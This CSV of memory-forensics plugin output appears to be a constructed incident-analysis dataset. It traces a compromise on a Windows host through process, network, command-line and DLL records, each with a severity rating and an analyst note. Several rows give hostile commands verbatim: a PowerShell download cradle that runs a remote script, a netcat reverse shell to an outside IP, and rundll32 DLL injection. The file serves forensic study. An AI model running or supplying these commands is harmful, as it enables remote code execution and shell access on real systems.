"Plugin","PID","PPID","Process Name","Offset","Threads","Handles","Session","Wow64","Creation Time","Exit Time","Artifact","Value","Severity","Notes"
"pslist","4","0","System","0x82341ab0","95","411","N/A","False","2024-01-15 07:00:00","","Process","System","Low","Normal system process"
"pslist","268","4","smss.exe","0x8234ab20","2","29","N/A","False","2024-01-15 07:00:01","","Process","smss.exe","Low","Normal session manager"
"pslist","356","348","csrss.exe","0x8234cd40","9","380","0","False","2024-01-15 07:00:02","","Process","csrss.exe","Low","Normal client server runtime"
"pslist","404","348","wininit.exe","0x8234ef60","1","75","0","False","2024-01-15 07:00:02","","Process","wininit.exe","Low","Normal Windows init"
"pslist","452","404","services.exe","0x82350180","6","201","0","False","2024-01-15 07:00:03","","Process","services.exe","Low","Normal service control manager"
"pslist","460","404","lsass.exe","0x823523a0","6","590","0","False","2024-01-15 07:00:03","","Process","lsass.exe","Low","Normal local security authority"
"pslist","1234","452","svchost.exe","0x823545c0","12","345","0","False","2024-01-15 07:00:05","","Process","svchost.exe","Low","Normal service host"
"pslist","1456","452","svchost.exe","0x823567e0","8","230","0","False","2024-01-15 07:00:06","","Process","svchost.exe","Low","Normal service host"
"pslist","1888","1456","malware.exe","0x823589f0","3","89","1","False","2024-01-15 03:47:00","","Process","malware.exe","Critical","Suspicious process spawned by svchost at 3AM"
"pslist","1992","1888","cmd.exe","0x8235ac10","1","45","1","False","2024-01-15 03:47:15","","Process","cmd.exe","High","cmd.exe spawned by malware.exe — likely shell execution"
"pslist","2100","1992","payload.ps1","0x8235ce30","2","60","1","False","2024-01-15 03:47:20","","Process","payload.ps1","Critical","PowerShell payload launched from cmd.exe"
"pslist","2200","2100","net.exe","0x8235f050","1","30","1","False","2024-01-15 03:48:00","2024-01-15 03:48:05","Process","net.exe","High","net.exe executed — possible user/group enumeration"
"pslist","2210","2100","whoami.exe","0x82360270","1","25","1","False","2024-01-15 03:48:10","2024-01-15 03:48:11","Process","whoami.exe","High","Privilege enumeration"
"pslist","2220","2100","ipconfig.exe","0x82362490","1","25","1","False","2024-01-15 03:48:15","2024-01-15 03:48:16","Process","ipconfig.exe","Medium","Network enumeration"
"pslist","2230","2100","netstat.exe","0x823646b0","1","25","1","False","2024-01-15 03:48:20","2024-01-15 03:48:21","Process","netstat.exe","Medium","Network connection enumeration"
"pslist","2240","1888","rundll32.exe","0x823668d0","2","55","1","True","2024-01-15 03:49:00","","Process","rundll32.exe","High","rundll32 spawned by malware — possible DLL injection"
"pslist","3200","1234","explorer.exe","0x82368af0","22","780","1","False","2024-01-15 07:05:00","","Process","explorer.exe","Low","Normal Windows Explorer"
"pslist","3400","3200","chrome.exe","0x8236ad10","25","400","1","False","2024-01-15 08:00:00","","Process","chrome.exe","Low","Normal browser process"
"pslist","4500","452","backdoor.exe","0x8236cf30","4","120","0","False","2024-01-15 03:50:00","","Process","backdoor.exe","Critical","Unknown process running as service — likely backdoor"
"pslist","4600","4500","nc.exe","0x8236f150","1","35","0","False","2024-01-15 03:50:30","","Process","nc.exe","Critical","Netcat detected — active reverse shell suspected"
"netscan","4600","","nc.exe","0x82371370","","","","","2024-01-15 03:50:30","","Network Connection","192.168.1.10:49200 -> 103.224.182.245:4444","Critical","Netcat outbound to known C2 IP on port 4444"
"netscan","1888","","malware.exe","0x82373590","","","","","2024-01-15 03:47:30","","Network Connection","192.168.1.10:49201 -> 185.220.101.45:80","Critical","malware.exe outbound HTTP to suspicious IP"
"netscan","3400","","chrome.exe","0x823757b0","","","","","2024-01-15 08:05:00","","Network Connection","192.168.1.10:52000 -> 142.250.80.46:443","Low","Normal Chrome HTTPS traffic"
"netscan","4500","","backdoor.exe","0x823779d0","","","","","2024-01-15 03:50:00","","Network Connection","0.0.0.0:8080 -> *:*","Critical","backdoor.exe listening on 0.0.0.0:8080"
"cmdline","1992","","cmd.exe","0x82379bf0","","","","","2024-01-15 03:47:15","","Command Line","cmd.exe /c powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.45/payload.ps1')","Critical","PowerShell download cradle — fileless malware execution"
"cmdline","2200","","net.exe","0x8237be10","","","","","2024-01-15 03:48:00","","Command Line","net user /domain","High","Domain user enumeration"
"cmdline","2240","","rundll32.exe","0x8237e030","","","","","2024-01-15 03:49:00","","Command Line","rundll32.exe C:\\Users\\JohnDoe\\AppData\\Roaming\\inject.dll,EntryPoint","Critical","DLL injection via rundll32"
"cmdline","4600","","nc.exe","0x82380250","","","","","2024-01-15 03:50:30","","Command Line","nc.exe -e cmd.exe 103.224.182.245 4444","Critical","Reverse shell command to C2"
"dlllist","1888","","malware.exe","0x82382470","","","","","2024-01-15 03:47:00","","DLL","C:\\Users\\JohnDoe\\AppData\\Roaming\\inject.dll","Critical","Injected DLL loaded by malware.exe"
"dlllist","2240","","rundll32.exe","0x82384690","","","","","2024-01-15 03:49:00","","DLL","C:\\Users\\JohnDoe\\AppData\\Roaming\\inject.dll","Critical","Same injected DLL loaded via rundll32"
